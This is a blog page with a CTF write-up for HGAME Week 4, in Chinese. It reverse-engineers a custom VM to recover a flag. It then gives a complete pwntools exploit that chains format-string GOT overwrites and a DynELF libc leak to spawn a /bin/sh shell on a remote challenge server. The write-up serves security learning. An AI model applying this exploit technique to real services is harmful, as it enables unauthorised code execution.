

<!DOCTYPE html>
<html lang="en" xmlns:v-bind="http://www.w3.org/1999/xhtml">
<head>
    <meta charset="utf-8">
    <meta name="X-UA-Compatible" content="IE=edge">
    <meta name="author" content="oyiadin">

    <title>HGAME Week4 Writeup - oyiadin</title>
    <meta name="description" content="">

    <meta name="keywords"
          content="">
    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
    <meta content="yes" name="apple-mobile-web-app-capable">
    <meta content="black" name="apple-mobile-web-app-status-bar-style">
    <meta content="telephone=no" name="format-detection">
    <meta name="renderer" content="webkit">
    <noscript>
        <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Sans+Pro:400|Montserrat|Anonymous+Pro:400|Material+Icons"/>
    </noscript>
    <link rel="short icon" href="../../favicon/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="../../css/bootstrap.min.css">
    <link rel="stylesheet" href="../../css/mprogress.css">
    <link rel="stylesheet" href="../../css/open-iconic.min.css">
    <link rel="stylesheet" href="../../css/style.css">
    <link rel="stylesheet" href="../../css/prism.css">
    <link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="../../atom.xml">
    <script>
        /*!
         loadCSS: load a CSS file asynchronously.
         [c]2014 @scottjehl, Filament Group, Inc.
         Licensed MIT
         */
        function loadCSS( href, before, media ){
            "use strict";
            var ss = window.document.createElement( "link" );
            var ref = before || window.document.getElementsByTagName( "script" )[ 0 ];
            var sheets = window.document.styleSheets;
            ss.rel = "stylesheet";
            ss.href = href;
            ss.media = "only x";
            ref.parentNode.insertBefore( ss, ref );
            function toggleMedia(){
                var defined;
                for( var i = 0; i < sheets.length; i++ ){
                    if( sheets[ i ].href && sheets[ i ].href.indexOf( href ) > -1 ){
                        defined = true;
                    }
                }
                if( defined ){
                    ss.media = media || "all";
                }
                else {
                    setTimeout( toggleMedia );
                }
            }
            toggleMedia();
            return ss;
        }
    </script>
</head>
<body>

<div id="app">
    <nav ref="navBar" class="navbar fixed-top navbar-light">
    <div id="global-loading-indicator" class="progress-line global-loading-indicator"></div>
    <div id="nav_background" class="nav-background"></div>
    <div style="padding-left: 15px;padding-right: 15px" class="container container-narrow nav-content">

        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" data-toggle="adropdown">
            <span class="oi" data-glyph="menu"></span>
        </button>
        <a id="nav_title" class="navbar-brand Montserrat" href="/">
            oyiadin
        </a>
        <div class="float-right navbar-dark nav-icon-group">
            <div class="dropdown">
                <ul class="dropdown-menu" id="collapsed_nav">
                    <li><a href="/" class="a-block nav-icon">Archive</a></li>
                    
                    
                    <li><a href="/about/index.html" class="a-block nav-icon">About Me &amp; Links</a></li>
                    
                    
                    <li><a href="/atom.xml" target="_blank" class="a-block">
                            <span data-glyph="rss" class="oi nav-icon"></span>
                        </a>
                    </li>
                    
                </ul>
            </div>

        </div>
    </div>
</nav>
    <div class="container container-narrow">

        <div ref="pageHead"
             v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }"
             class="page-head">
            <a href="/">
                <h2>oyiadin</h2>
                <h5>Shares anything interesting.</h5>
            </a>
        </div>

<div class="row stream-container">
    <div class="card-container">

        <div class="card card-item clear-border card-top-patch card-clear-hover">
            

            <div class="card-item-container clear-flex-xs">
                <div class="card-inner-cell">
                    <h2>HGAME Week4 Writeup</h2>

                    <div>
                        <p>
                            <time datetime="2018-03-07T12:30:30.000Z" itemprop="datePublished">
                                2018-03-07 20:30
                            </time>
                            

                            
                            
                            <span class="oi" data-glyph="tag" style="vertical-align: middle; margin-left: 5px"> </span>&nbsp;
                            
                            <a href='/tags/CTF/'>CTF</a>
                            
                            ,
                            
                            
                            <a href='/tags/Writeup/'>Writeup</a>
                            
                            ,
                            
                            
                            <a href='/tags/Reverse/'>Reverse</a>
                            
                            ,
                            
                            
                            <a href='/tags/HGAME/'>HGAME</a>
                            
                            ,
                            
                            
                            <a href='/tags/Pwn/'>Pwn</a>
                            
                            ,
                            
                            
                            <a href='/tags/VM/'>VM</a>
                            
                            ,
                            
                            
                            <a href='/tags/DynELF/'>DynELF</a>
                            
                            ,
                            
                            
                            <a href='/tags/FmtStr/'>FmtStr</a>
                            
                            
                            
                        </p>
                    </div>


                    <p class=" post-block-desc">
                        <p>开学了 XD 谢谢这些 dalao 们~！这个寒假是我至今学了最多姿势的一个假期~</p>
<h2 id="Re"><a href="#Re" class="headerlink" title="{ Re }"></a>{ Re }</h2><h3 id="virtual-waifu-500"><a href="#virtual-waifu-500" class="headerlink" title="virtual_waifu [500]"></a>virtual_waifu [500]</h3><p>拖进 IDA 读一下 <code>main()</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">  run((<span class="keyword">int</span>)&amp;v169, (<span class="keyword">int</span> *)&amp;v5);  <span class="comment">// 一番操作</span></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *((_BYTE *)&amp;input + i) == byte_40318C[i] )  <span class="comment">// 比对，长度 24 Bytes</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++i &gt;= <span class="number">24</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">int</span>)<span class="string">"Never Give Up\n"</span>);</span><br><span class="line">LABEL_6:</span><br><span class="line">  system(<span class="string">"pause"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上边那一大段自然就是 VM 的数据来源了。先进去子函数捋一捋这个 VM 是怎么工作的，整理后，主要逻辑如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// m2 = malloc(256), 大致被当成一个栈来使用</span></span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">  m2[ <span class="number">4</span> * ++ptr ] = reg2;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  reg2 = m2[ <span class="number">4</span> * ptr-- ];</span><br><span class="line">  reg22 = reg2;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  m2[ <span class="number">4</span> * ++ptr ] = reg4;</span><br><span class="line">  <span class="keyword">goto</span> just_exit;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">  reg4 = m2[ <span class="number">4</span> * ptr-- ];</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">  m2[ <span class="number">4</span> * ++ptr ] = *pdata++;</span><br><span class="line">  <span class="keyword">goto</span> just_exit;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:  <span class="comment">// 解引用得到单个字母</span></span><br><span class="line">  m2[ <span class="number">4</span> * ptr ] = *(m2[ <span class="number">4</span> * ptr ]);</span><br><span class="line">  <span class="keyword">goto</span> just_exit;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">  v35 = m2[ <span class="number">4</span> * ptr-- ];</span><br><span class="line">  v36 = m2[ <span class="number">4</span> * ptr-- ];</span><br><span class="line">  *v35 = v36;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_21;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">  v14 = m2[ <span class="number">4</span> * ptr-- ];</span><br><span class="line">  m2[ <span class="number">4</span> * ptr ] += v14;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_11;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">  v17 = m2[ <span class="number">4</span> * ptr-- ];</span><br><span class="line">  m2[ <span class="number">4</span> * ptr ] -= v17;</span><br><span class="line">LABEL_11:</span><br><span class="line">  v40 = (m2[ <span class="number">4</span> * ptr ] == <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">goto</span> LABEL_21;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">  v20 = m2[ <span class="number">4</span> * ptr-- ];</span><br><span class="line">  m2[ <span class="number">4</span> * ptr ] ^= v20;</span><br><span class="line">  <span class="keyword">goto</span> just_exit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0xB</span>:</span><br><span class="line">  pdata += m2[ <span class="number">4</span> * ptr-- ];</span><br><span class="line">  <span class="keyword">goto</span> just_exit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">  v24 = m2[ <span class="number">4</span> * ptr-- ];</span><br><span class="line">  <span class="keyword">if</span> ( flag )</span><br><span class="line">    pdata += v24;</span><br><span class="line">  <span class="keyword">goto</span> just_exit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0xD</span>:</span><br><span class="line">  <span class="built_in">free</span>((<span class="keyword">void</span> *)m2);</span><br><span class="line">  <span class="built_in">free</span>(m1);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0xE</span>:</span><br><span class="line">  v40 = ( m2[ <span class="number">4</span> * ptr ] == m2[ <span class="number">4</span> * (ptr<span class="number">-1</span>) ] );</span><br><span class="line">LABEL_21:</span><br><span class="line">  flag = v40;</span><br><span class="line">  <span class="keyword">goto</span> just_exit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">  m2[ <span class="number">4</span> * ptr ] = <span class="built_in">strlen</span>(m2[ <span class="number">4</span> * ptr ]);</span><br><span class="line">just_exit:</span><br><span class="line">  reg2 = reg22;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">  <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>程序从 v169 到 v176 以 Byte 为单位读取数据，根据数据进行相应的操作。<code>v169 ~ v176</code> 相当于 <code>.text</code>，<code>v5 ~ v166</code> 相当于 <code>.data</code>。堆里的 <code>m2</code> 相当于栈，<code>ptr--</code> 跟 <code>ptr++</code> 分别对应于 <code>pop</code> 与 <code>push</code>。我将程序的流程转换成以下伪代码以便理解：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">*++p = pop</span><br><span class="line">R1 = *p</span><br><span class="line">*p = <span class="built_in">strlen</span>(p)</span><br><span class="line">*++p = pop</span><br><span class="line"><span class="comment">// loop begin</span></span><br><span class="line">*(p+<span class="number">1</span>) = pop</span><br><span class="line"><span class="keyword">if</span> *p == *(p<span class="number">-1</span>): jump offset *(p+<span class="number">1</span>)</span><br><span class="line">R2 = *p--</span><br><span class="line">*++p = R1</span><br><span class="line">*++p = R2</span><br><span class="line">*(p<span class="number">-1</span>) += *p</span><br><span class="line">p--</span><br><span class="line">*p = **p</span><br><span class="line">*++p = pop</span><br><span class="line">*++p = R2</span><br><span class="line">*(p<span class="number">-1</span>) -= *p</span><br><span class="line">p--</span><br><span class="line">*(p<span class="number">-1</span>) += *p</span><br><span class="line">p--</span><br><span class="line">*++p = pop</span><br><span class="line">*(p<span class="number">-1</span>) ^= *p</span><br><span class="line">p--</span><br><span class="line">*++p = R1</span><br><span class="line">*++p = R2</span><br><span class="line">*(p<span class="number">-1</span>) += *p</span><br><span class="line">p--</span><br><span class="line">**p = *(p<span class="number">-1</span>)</span><br><span class="line">p-=<span class="number">2</span></span><br><span class="line">*++p = R2</span><br><span class="line">*++p = pop</span><br><span class="line">*(p<span class="number">-1</span>) += *p</span><br><span class="line">p--</span><br><span class="line">R2 = *p--</span><br><span class="line">*++p = R2</span><br><span class="line">*++p = pop</span><br><span class="line">jump offset *p--</span><br><span class="line"><span class="comment">// loop end</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p>然后自己在纸上划拉了大半天，直到 <code>0xD</code> 要跑路的时候才发现居然没有循环……那肯定错了呀 hhh 之后我就观察了一下对应 <code>.text</code> 的数据，发现是按周期重复的……因此，我猜想每次循环都是同样的操作，按刚才人脑运行得知的 <code>(dest^204)-23</code> 去做，发现错了。果断再动调一遍，发现了！很明显的规律！（所以我在群里说这题应该是放水了 QWQ）于是乱敲一顿 py 可得到 Flag：hgame{3z_vm_u_cr4ck5d_g00d_J0b}</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dest = [</span><br><span class="line">    <span class="number">0x86</span>, <span class="number">0x5C</span>, <span class="number">0xB8</span>, <span class="number">0x46</span>, <span class="number">0x4C</span>, <span class="number">0xBD</span>, <span class="number">0x4A</span>, <span class="number">0xA3</span>,</span><br><span class="line">    <span class="number">0xBE</span>, <span class="number">0x4C</span>, <span class="number">0x8D</span>, <span class="number">0xA3</span>, <span class="number">0xBA</span>, <span class="number">0xF3</span>, <span class="number">0xA1</span>, <span class="number">0xAB</span>,</span><br><span class="line">    <span class="number">0xA2</span>, <span class="number">0xFA</span>, <span class="number">0xF9</span>, <span class="number">0xA4</span>, <span class="number">0xAE</span>, <span class="number">0x80</span>, <span class="number">0xFD</span>, <span class="number">0xAE</span> ]</span><br><span class="line">d = <span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(dest)):</span><br><span class="line">    dest[i] = chr((dest[i] ^ <span class="number">204</span>)-d)</span><br><span class="line">    d-=<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>.join(dest)</span><br></pre></td></tr></table></figure>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="{ Pwn }"></a>{ Pwn }</h2><h3 id="base64-decoder-350"><a href="#base64-decoder-350" class="headerlink" title="base64_decoder [350]"></a>base64_decoder [350]</h3><p>这道题我遇到了这三个障碍：</p>
<ol>
<li>泄露不出正确的 libc 加载地址</li>
<li>只有两次输入的机会</li>
<li>不知道栈究竟在内存里的什么地方，无法通过 <code>%k$n</code> 来控制栈上的数据，就算知道 <code>system</code> 的地址，也不知道如何传 <code>/bin/sh</code></li>
</ol>
<p>后来放出的 Hint 解决了我第一个问题。对于第二个问题，我直接把 <code>GOT</code> 表里的 <code>exit</code> 给指向了原函数里 <code>if (!times) { ... }</code> 这段代码的后边，负面影响是会改变栈的深度，不过我想不到更好的方法了。而第三个问题是在看<a href="https://www.anquanke.com/post/id/84905" target="_blank" rel="noopener">这篇文章</a>时找到灵感的：程序调用了好几个 libc 里的函数，而有好几个函数的第一个参数是可控的，只要我修改其 <code>GOT</code> 表值使其指向 <code>system</code>，并控制其第一个参数即可。</p>
<p><code>fmtstr</code> 倒不是障碍，看懂原理后我就直接用 <code>pwntools</code> 相关工具了。用 <code>printf</code> leak memory 时依旧会遇到空字符截断的问题，跟上周一样，我选择逐 Byte 拿，然后再接起来。</p>
<p>最终 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode <span class="keyword">as</span> b64</span><br><span class="line"></span><br><span class="line">conn = remote(<span class="string">'111.230.149.72'</span>, <span class="number">10013</span>)</span><br><span class="line"><span class="comment">#conn = process('./base64_decoder')</span></span><br><span class="line">file = ELF(<span class="string">'./base64_decoder'</span>)</span><br><span class="line"></span><br><span class="line">conn.sendlineafter(<span class="string">'&gt; '</span>, b64(<span class="string">'AAAA'</span>))  <span class="comment"># 为了保持 leak 期间 offset===12</span></span><br><span class="line"></span><br><span class="line">payl = fmtstr_payload(<span class="number">7</span>, &#123;file.got[<span class="string">'exit'</span>]: <span class="number">0x80488BB</span>&#125;)  <span class="comment"># 跳！给我跳！=w=</span></span><br><span class="line">conn.sendlineafter(<span class="string">'&gt; '</span>, b64(payl))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">    tmp = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">4</span>):  <span class="comment"># 对付 \x00，逐位取</span></span><br><span class="line">        conn.sendline(b64(<span class="string">'@%14$sAA'</span> + p32(addr+i)))</span><br><span class="line">        conn.recvuntil(<span class="string">'@'</span>)</span><br><span class="line">        ret = conn.recvuntil(<span class="string">'AA'</span>)</span><br><span class="line">        tmp += ret[<span class="number">0</span>] <span class="keyword">if</span> ret != <span class="string">'AA'</span> <span class="keyword">else</span> <span class="string">'\x00'</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line">dyn = DynELF(leak, elf=ELF(<span class="string">'./base64_decoder'</span>))</span><br><span class="line"></span><br><span class="line">payl = fmtstr_payload(<span class="number">12</span>, &#123;file.got[<span class="string">'strcmp'</span>]: dyn.lookup(<span class="string">'system'</span>, <span class="string">'libc'</span>)&#125;)</span><br><span class="line">conn.sendlineafter(<span class="string">'&gt; '</span>, b64(payl))  <span class="comment"># 下一次输入将直接成为 system 的参数</span></span><br><span class="line">conn.sendlineafter(<span class="string">'&gt; '</span>, <span class="string">'/bin/sh'</span>)  <span class="comment"># 无需 base64</span></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure>

                    </p>

                    <nav class="pagination" role="pagination">
    
    <a class="newer-posts" href="../a-note-on-configure-my-deep-learning-developing-environment/">
        Previous post: 深度学习开发环境配置记录 (tf+torch)
    </a>
    
    <span class="page-number"></span>
    
    <a class="older-posts" href="../writeup-of-hgame-week3/">
        Next post: HGAME Week3 Writeup
    </a>
    
</nav>

                    
                </div>
            </div>
        </div>
    </div>
</div>

<footer>
    <p>
        &copy;&nbsp;2018&nbsp;<a target="_blank"
                                                               href="">oyiadin</a>
    </p>

    
    <p>Theme&nbsp;<a target="_blank"
                     href="https://github.com/SumiMakito/hexo-theme-journal">Journal.</a>&nbsp;by&nbsp;<a
                target="_blank" href="https://www.keep.moe">Makito</a>
    </p>
    

    <p>
        Proudly published with&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>
    </p>
</footer>

</div>
</div>
</div>
<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
<script src="../../js/popper.min.js"></script>
<script src="../../js/bootstrap.min.js"></script>
<script src=" ../../js/vue.min.js"></script>
<script src=" ../../js/journal.js"></script>
<script>
    loadCSS("//fonts.googleapis.com/css?family=Source+Sans+Pro:400|Montserrat|Anonymous+Pro:400|Material+Icons");
</script>


<script>
    $(document).ready(function () {
        $("#global-loading-indicator").fadeOut(600);
    });
</script>

</body>
</html>
